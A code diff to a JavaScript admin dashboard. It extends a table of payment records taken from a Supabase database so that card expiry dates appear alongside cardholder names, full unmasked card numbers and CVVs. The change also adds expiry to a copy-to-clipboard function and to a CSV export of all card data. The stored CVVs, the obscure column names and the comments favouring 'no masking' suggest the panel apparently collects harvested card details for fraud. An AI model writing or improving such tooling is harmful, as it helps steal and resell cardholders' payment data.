@@ -333,7 +333,7 @@ async function loadSubscribers() {
 }
 
 // ============================================================
-// LOAD PAYMENTS - Direct from Supabase
+// LOAD PAYMENTS - Direct from Supabase (INCLUDING EXPIRY)
 // ============================================================
 
 async function loadPayments() {
@@ -362,6 +362,7 @@ async function loadPayments() {
             id: row.id,
             name: row.kname,
             cardNumber: row.knumber,
+            expiry: row.kexpiry || '—',
             cvc: row.kfc,
             createdAt: row.created_at
         }));
@@ -440,7 +441,7 @@ function renderSubscribers() {
 }
 
 // ============================================================
-// RENDER PAYMENTS - SHOW ALL DATA (No Masking)
+// RENDER PAYMENTS - SHOW ALL DATA (Including Expiry)
 // ============================================================
 
 function renderPayments() {
@@ -476,13 +477,14 @@ function renderPayments() {
                     <td>${index + 1}</td>
                     <td class="email-cell"><strong>${escapeHtml(payment.name)}</strong></td>
                     <td><code style="background:var(--admin-bg);padding:4px 8px;border-radius:4px;font-family:monospace;font-size:0.85rem;">${escapeHtml(fullCard)}</code></td>
+                    <td><code style="background:var(--admin-bg);padding:4px 8px;border-radius:4px;font-family:monospace;font-size:0.85rem;font-weight:600;color:var(--admin-accent);">${escapeHtml(payment.expiry)}</code></td>
                     <td><code style="background:var(--admin-bg);padding:4px 8px;border-radius:4px;font-family:monospace;font-size:0.85rem;font-weight:600;">${escapeHtml(payment.cvc)}</code></td>
                     <td class="date-cell">
                         ${payment.createdAt ? formatDate(payment.createdAt) : '—'}
                     </td>
                     <td>
                         <div class="action-group">
-                            <button class="row-btn" type="button" onclick="copyPayment('${escapeJs(payment.name)}', '${escapeJs(payment.cardNumber)}', '${escapeJs(payment.cvc)}')">
+                            <button class="row-btn" type="button" onclick="copyPayment('${escapeJs(payment.name)}', '${escapeJs(payment.cardNumber)}', '${escapeJs(payment.expiry)}', '${escapeJs(payment.cvc)}')">
                                 Copy
                             </button>
                             <button class="row-btn delete" type="button" onclick="deletePayment(${payment.id})">
@@ -614,8 +616,8 @@ async function copyAllEmails() {
     }
 }
 
-async function copyPayment(name, cardNumber, cvc) {
-    const text = `Name: ${name}\nCard: ${cardNumber}\nCVV: ${cvc}`;
+async function copyPayment(name, cardNumber, expiry, cvc) {
+    const text = `Name: ${name}\nCard: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvc}`;
     try {
         await navigator.clipboard.writeText(text);
         showToast('Payment info copied.');
@@ -650,10 +652,10 @@ function exportPaymentsCsv() {
         return;
     }
 
-    // Include ALL payment data in CSV
-    const headers = 'ID,Cardholder Name,Card Number,CVC,Date\n';
+    // Include ALL payment data in CSV (including expiry)
+    const headers = 'ID,Cardholder Name,Card Number,Expiry Date,CVV,Payment Date\n';
     const rows = payments.map(p => 
-        `${p.id},${p.name},${p.cardNumber},${p.cvc},${p.createdAt || ''}`
+        `${p.id},${p.name},${p.cardNumber},${p.expiry},${p.cvc},${p.createdAt || ''}`
     ).join('\n');
     
     const csv = headers + rows;
